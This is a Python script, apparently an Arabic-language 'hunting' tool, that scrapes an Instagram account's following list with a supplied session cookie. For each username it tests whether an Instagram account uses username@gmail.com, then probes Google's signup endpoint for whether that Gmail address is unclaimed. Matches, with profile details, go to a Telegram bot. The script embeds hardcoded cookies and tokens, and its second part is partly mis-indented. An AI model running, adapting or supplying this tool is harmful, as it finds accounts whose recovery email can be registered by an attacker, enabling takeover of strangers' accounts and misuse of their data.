def sof():
	print('''1- سحب لسته | Pull list
	2- فحص لسته | Check your list	
	
	
''')
sof()

	


i = input('Choose one of the numbers => ')

if i == '1':
	import requests
	from user_agent import *
	import webbrowser
	webbrowser.open('https://t.me/tols_python')


	nm = 0
	nn = 0
	ab = 0
	
	ses = input('Enter Your sessionid => ')
	
	user = 'emphisoconnell'
	
	cookies = {
	    'mid': 'aLwkRQABAAGr1Z4Afmt8o5rJiUnt',
	    'datr': 'RSS8aI947eeFICnGkp3xIIzK',
	    'ig_did': '823C3C9E-623F-423B-BEF0-5B0D72A3D199',
	    'ig_nrcb': '1',
	    'ps_l': '1',
	    'ps_n': '1',
	    'dpr': '3.0234789848327637',
	    'wd': '891x1671',
	    'csrftoken': 'VsdxeWIk3PhIGgOgpbgL1SoDAjDvqbcG',
	    'ds_user_id': '76624094065',
	    'sessionid': ses,
	    'rur': '"RVA\\05476624094065\\0541790862462:01feb048cff984b51357b7f3047e40efa18a2d26dec8043d3f5b35b3846aef4644f5b3a5"',
	}
	
	headers = {
	    'authority': 'www.instagram.com',
	    'accept': '*/*',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    # 'cookie': 'mid=aLwkRQABAAGr1Z4Afmt8o5rJiUnt; datr=RSS8aI947eeFICnGkp3xIIzK; ig_did=823C3C9E-623F-423B-BEF0-5B0D72A3D199; ig_nrcb=1; ps_l=1; ps_n=1; dpr=3.0234789848327637; wd=891x1671; csrftoken=VsdxeWIk3PhIGgOgpbgL1SoDAjDvqbcG; ds_user_id=76624094065; sessionid=76624094065%3Af6daBurMIlDOld%3A21%3AAYgArsfQYmvWTBFuo1Jc8U7ccdnnJUFkYIQZliIXNg; rur="RVA\\05476624094065\\0541790862462:01feb048cff984b51357b7f3047e40efa18a2d26dec8043d3f5b35b3846aef4644f5b3a5"',
	    'referer': 'https://www.instagram.com/leomessi/following/',
	    'sec-ch-prefers-color-scheme': 'dark',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
	    'sec-ch-ua-mobile': '?0',
	    'sec-ch-ua-model': '""',
	    'sec-ch-ua-platform': '"Linux"',
	    'sec-ch-ua-platform-version': '""',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': str(generate_user_agent()),
	    'x-asbd-id': '359341',
	    'x-csrftoken': 'VsdxeWIk3PhIGgOgpbgL1SoDAjDvqbcG',
	    'x-ig-app-id': '936619743392459',
	    'x-ig-www-claim': 'hmac.AR1CH0YtSFRo4XI98AI3SlSrSLVT5TMAunIV6l0WWIx0T-yq',
	    'x-requested-with': 'XMLHttpRequest',
	    'x-web-session-id': '3ee3kf:09bexr:h5fw5b',
	}
	#_______________________________
	
	params = {
	    'username': user,
	}
	
	response = requests.get(
	    'https://www.instagram.com/api/v1/users/web_profile_info/',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	).json()
	
	try:
		fos = response['data']['user']['edge_follow']['count']
		
		ido = response['data']['user']['id']
		print(ido)
		
	except:
		print('اليوزر او السيشن مبند')
		exit()
	
	#_______________________________
	
	
	def mm(nm):
		global nn,ab
		params = {
		    'count': '12',
		    'max_id': nm,
		}
		
		response = requests.get(
		    f'https://www.instagram.com/api/v1/friendships/{ido}/following/',
		    params=params,
		    cookies=cookies,
		    headers=headers,
		).json()
		
		ab=0
		
		while True:
			try:
				nn+=1
				ab+=1
				
				user = response['users'][ab]['username']
				print(f'{nn} : {user}')
				with open('tols_python.text', 'a') as m:
					m.write(f'{user}\n')
			except:
				nm+=12
				mm(nm)
				
			if nn == fos:
				print('DN')
				exit()
				
	mm(nm=0)
	

if i == '2':
	import requests
	import time
	import random
	import os
	from user_agent import *
	import uuid
	import webbrowser
	webbrowser.open('https://t.me/tols_python')
	import json
#_______________________________

ID = input('ENTER YOUR ID :> ')
token = input('ENTER YOUR Token :> ')

os.system('clear')

lo = '''


⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣤⡶⠁⣠⣴⣾⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣿⣿⣴⣿⠿⠋⣁⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣰⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⣠⣾⣿⡿⠟⠋⠉⠀⣀⣀⣀⣨⣭⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣤⣤⣤⣴⠂
⠈⠉⠁⠀⠀⣀⣴⣾⣿⣿⡿⠟⠛⠉⠉⠉⠉⠉⠛⠻⠿⠿⠿⠿⠿⠿⠟⠋⠁⠀
⠀⠀⠀⢀⣴⣿⣿⣿⡿⠁⠀⢀⣀⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣾⣿⣿⣿⡿⠁⢀⣴⣿⠋⠉⠉⠉⠉⠛⣿⣿⣶⣤⣤⣤⣤⣶⠖⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⡇⢀⣿⣿⣇⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀
⠀⠀⠸⣿⣿⣿⣿⡇⠈⢿⣿⣿⠇⠀⠀⠀⠀⠀⢠⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢿⣿⣿⣿⣷⡀⠀⠉⠉⠀⠀⠀⠀⠀⢀⣾⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠙⢿⣿⣿⣷⣄⡀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣋⣠⡤⠄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠙⠛⠛⠿⠿⠿⠿⠿⠿⠟⠛⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀JAI VOlTER BROTHER

'''


print(lo)



#----------------------------------
Z = '\033[1;31m'  # أحمر
X = '\033[1;33m'  # أصفر
F = '\033[2;32m'  # أخضر
C = "\033[1;97m"  # أبيض
B = '\033[2;36m'  # أزرق
Y = '\033[1;34m'  # أزرق داكن
W = '\033[0;37m'  # رمادي
#-------------------------------



def ss():
	fil = open('tols_python.text','r').read().splitlines()
	
	for user in fil:
		email = str(user)	
		
		
		cookies = {
		    'mid': 'aLwkRQABAAGr1Z4Afmt8o5rJiUnt',
		    'datr': 'RSS8aI947eeFICnGkp3xIIzK',
		    'ig_did': '823C3C9E-623F-423B-BEF0-5B0D72A3D199',
		    'ig_nrcb': '1',
		    'dpr': '3.0234789848327637',
		    'ps_l': '1',
		    'ps_n': '1',
		    'rur': '"CLN\\05476273102189\\0541789890489:01fece6f2351bf56b7dec7c25294521948e7eec18de616f3042a8202d24119a8768674b6"',
		    'csrftoken': '2laq6ggRv3lclZJOwcBm7NET57VwsTr6',
		    'wd': '891x1671',
		}
		
		headers = {
		    'authority': 'www.instagram.com',
		    'accept': '*/*',
		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'content-type': 'application/x-www-form-urlencoded',
		    # 'cookie': 'mid=aLwkRQABAAGr1Z4Afmt8o5rJiUnt; datr=RSS8aI947eeFICnGkp3xIIzK; ig_did=823C3C9E-623F-423B-BEF0-5B0D72A3D199; ig_nrcb=1; dpr=3.0234789848327637; ps_l=1; ps_n=1; rur="CLN\\05476273102189\\0541789890489:01fece6f2351bf56b7dec7c25294521948e7eec18de616f3042a8202d24119a8768674b6"; csrftoken=2laq6ggRv3lclZJOwcBm7NET57VwsTr6; wd=891x1671',
		    'origin': 'https://www.instagram.com',
		    'referer': 'https://www.instagram.com/?flo=true',
		    'sec-ch-prefers-color-scheme': 'dark',
		    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
		    'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
		    'sec-ch-ua-mobile': '?0',
		    'sec-ch-ua-model': '""',
		    'sec-ch-ua-platform': '"Linux"',
		    'sec-ch-ua-platform-version': '""',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-origin',
		    'user-agent': str(generate_user_agent()),
		    'x-asbd-id': '359341',
		    'x-csrftoken': '2laq6ggRv3lclZJOwcBm7NET57VwsTr6',
		    'x-ig-app-id': '936619743392459',
		    'x-ig-www-claim': 'hmac.AR3jIdi-qYJYuSEkEOZTC1I8i3-9uZL3GBNj23LiTHqAIRKs',
		    'x-instagram-ajax': '1027367977',
		    'x-requested-with': 'XMLHttpRequest',
		    'x-web-session-id': 'gu2by1:hbgt0u:rcctnh',
		}
		
		p = str(time.time()).split(".")[0]
		data = {
		    'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{p}:hdudjehdufhd',
		    'caaF2DebugGroup': '0',
		    'isPrivacyPortalReq': 'false',
		    'loginAttemptSubmissionCount': '0',
		    'optIntoOneTap': 'false',
		    'queryParams': '{"flo":"true"}',
		    'trustedDeviceRecords': '{}',
		    'username': f'{email}@gmail.com',
		    'jazoest': '22796',
		}
		
		response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', cookies=cookies, headers=headers, data=data).text
		
		if '"user":true' in response:
			print(f'{F}GOOD INS : {email}')
			
			cookies = {
				    'AEC': 'AaJma5v9-BWHyIVFUKjD-0vTzm2X5H0-g4BnIYzSo2TLDvUT0E_orZF6U_s',
				    'NID': '525=BQPn5mScV8e4Kx-l5bPfQslDxrb_ySUbxuji6LoL7J7SjhPDG9OF1ctteipFlpTHRs8dItSxT1dEVsLAhy-5EP3Kre1BL9eqQLfJSOuGFyA59pAkDr6POUeO2FlUoFa9VpTN76TVOX4mlmFx641Hz1UTpuk0vtcZMwgMqyxf6EscV4AewNDW16BjF9R8y4Te0mBzJXxFZs7MPENP35se-mPajlhEdrdw1nwh0bgZaftJua9Nv6Gr4gqEPzmPAdA',
				    '__Host-GAPS': '1:TFe26FPIQEUJ0B2sL2r1tRl69yVFvg:O8ifRoj-KXgnrcLF',
				    'OTZ': '8267514_44_44__44_',
				}
				
			headers = {
				    'authority': 'accounts.google.com',
				    'accept': '*/*',
				    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
				    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
				    # 'cookie': 'AEC=AaJma5v9-BWHyIVFUKjD-0vTzm2X5H0-g4BnIYzSo2TLDvUT0E_orZF6U_s; NID=525=BQPn5mScV8e4Kx-l5bPfQslDxrb_ySUbxuji6LoL7J7SjhPDG9OF1ctteipFlpTHRs8dItSxT1dEVsLAhy-5EP3Kre1BL9eqQLfJSOuGFyA59pAkDr6POUeO2FlUoFa9VpTN76TVOX4mlmFx641Hz1UTpuk0vtcZMwgMqyxf6EscV4AewNDW16BjF9R8y4Te0mBzJXxFZs7MPENP35se-mPajlhEdrdw1nwh0bgZaftJua9Nv6Gr4gqEPzmPAdA; __Host-GAPS=1:TFe26FPIQEUJ0B2sL2r1tRl69yVFvg:O8ifRoj-KXgnrcLF; OTZ=8267514_44_44__44_',
				    'origin': 'https://accounts.google.com',
				    'referer': 'https://accounts.google.com/',
				    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
				    'sec-ch-ua-arch': '""',
				    'sec-ch-ua-bitness': '""',
				    'sec-ch-ua-full-version': '"137.0.7337.0"',
				    'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
				    'sec-ch-ua-mobile': '?1',
				    'sec-ch-ua-model': '"2201116PG"',
				    'sec-ch-ua-platform': '"Android"',
				    'sec-ch-ua-platform-version': '"13.0.0"',
				    'sec-ch-ua-wow64': '?0',
				    'sec-fetch-dest': 'empty',
				    'sec-fetch-mode': 'cors',
				    'sec-fetch-site': 'same-origin',
				    'user-agent': str(generate_user_agent()),
				    'x-chrome-connected': 'source=Chrome,eligible_for_consistency=true',
				    'x-client-data': 'CN/1ygEIxJrNAQ==',
				    'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
				    'x-goog-ext-391502476-jspb': '["S-2044728815:1758354834722688","mail"]',
				    'x-same-domain': '1',
				}
				
			params = {
				    'rpcids': 'NHJMOd',
				    'source-path': '/lifecycle/steps/signup/username',
				    'f.sid': '-3518311136533997803',
				    'bl': 'boq_identity-account-creation-evolution-ui_20250917.06_p0',
				    'hl': 'ar',
				    'TL': 'AMbiOOT4n4dKXm9j5pupUh6KzBdDIlWXt7z8lowdT8Cd0CAXwoL6dZSi9BCGSzaY',
				    '_reqid': '1539237',
				    'rt': 'c',
				}
				
			data = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{email}%5C%22%2C0%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C0%2C8223%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at=AMhHV2JJH794p9pXW3KUaHQeiWxW%3A1758354835354&'
				
			response = requests.post(
				    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
				    params=params,
				    cookies=cookies,
				    headers=headers,
				    data=data,
			).text
			if '"steps/signup/password"' in response:
					print(f'{F}GOOD GMAIL : {email}')
		
		
					cookies = {
					    'mid': 'aLwkRQABAAGr1Z4Afmt8o5rJiUnt',
					    'datr': 'RSS8aI947eeFICnGkp3xIIzK',
					    'ig_did': '823C3C9E-623F-423B-BEF0-5B0D72A3D199',
					    'ig_nrcb': '1',
					    'dpr': '3.0234789848327637',
					    'ps_l': '1',
					    'ps_n': '1',
					    'csrftoken': '2laq6ggRv3lclZJOwcBm7NET57VwsTr6',
					    'wd': '891x1671',
					}
					
					headers = {
					    'authority': 'www.instagram.com',
					    'accept': '*/*',
					    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
					    # 'cookie': 'mid=aLwkRQABAAGr1Z4Afmt8o5rJiUnt; datr=RSS8aI947eeFICnGkp3xIIzK; ig_did=823C3C9E-623F-423B-BEF0-5B0D72A3D199; ig_nrcb=1; dpr=3.0234789848327637; ps_l=1; ps_n=1; csrftoken=2laq6ggRv3lclZJOwcBm7NET57VwsTr6; wd=891x1671',
					    'referer': 'https://www.instagram.com/dfff/',
					    'sec-ch-prefers-color-scheme': 'dark',
					    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
					    'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
					    'sec-ch-ua-mobile': '?0',
					    'sec-ch-ua-model': '""',
					    'sec-ch-ua-platform': '"Linux"',
					    'sec-ch-ua-platform-version': '""',
					    'sec-fetch-dest': 'empty',
					    'sec-fetch-mode': 'cors',
					    'sec-fetch-site': 'same-origin',
					    'user-agent': str(generate_user_agent()),
					    'x-asbd-id': '359341',
					    'x-csrftoken': '2laq6ggRv3lclZJOwcBm7NET57VwsTr6',
					    'x-ig-app-id': '936619743392459',
					    'x-ig-www-claim': '0',
					    'x-requested-with': 'XMLHttpRequest',
					    'x-web-session-id': 'tlq2rv:uh2xbz:9ex777',
					}
					
					params = {
					    'username': email,
					}
					try:
						response = requests.get(
						    'https://www.instagram.com/api/v1/users/web_profile_info/',
						    params=params,
						    cookies=cookies,
						    headers=headers,
						).json()
					except json.decoder.JSONDecodeError:
						pass
					
					io = response['data']['user']['biography']
					
					fol = response['data']['user']['edge_followed_by']['count']
					
					
					fos = response['data']['user']['edge_follow']['count']
					
					
					ido = response['data']['user']['id']
					
					
					nam = response['data']['user']['full_name']
					
					
				
					
					op = response['data']['user']['edge_owner_to_timeline_media']['count']
					
					
					try:
						re=requests.get(f'https://o7aa.pythonanywhere.com/?id={ido}').json()
						date22=re['date']
					except:
						print('No Data')
						
					ff = f'''
					
					࿕┈┉━ ᯓ 𓆩𓆪 ᯓ ━┅┄࿕
					「❃」𝗡𝗔𝗠𝗘  ☇ {nam}
					「❃」𝗨𝗘𝗦𝗥 ☇ {email}
					「❃」𝗙𝗢𝗟𝗟𝗢𝗪𝗘𝗥𝗦  ☇ {fol}
					「❃」𝗙𝗢𝗟𝗟𝗢𝗪𝗜𝗡𝗚  ☇ {fos}
					「❃」𝗗𝗔𝗧𝗘  ☇ {date22}
					「❃」𝗜𝗗 ☇ {ido}
					「❃」ID  ☇ {io}					「❃」𝗣𝗢𝗦𝗧𝗦 ☇ {op}
					「❃」𝗟𝗜𝗡𝗞 ☇ https://www.instagram.com/{email}   
					࿕┈┉━ ᯓ 𓆩 𓆪 ᯓ ━┅┄࿕
					⊊𝗕𝗬⊋ @S_O_F3'''
					tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={ff}''')
					i = requests.post(tlg)
			else:
				print(f'{Z}BAD GMAIL : {email}')
				
			
		else:
			print(f'{Z}BAD INS : {email}')
ss()

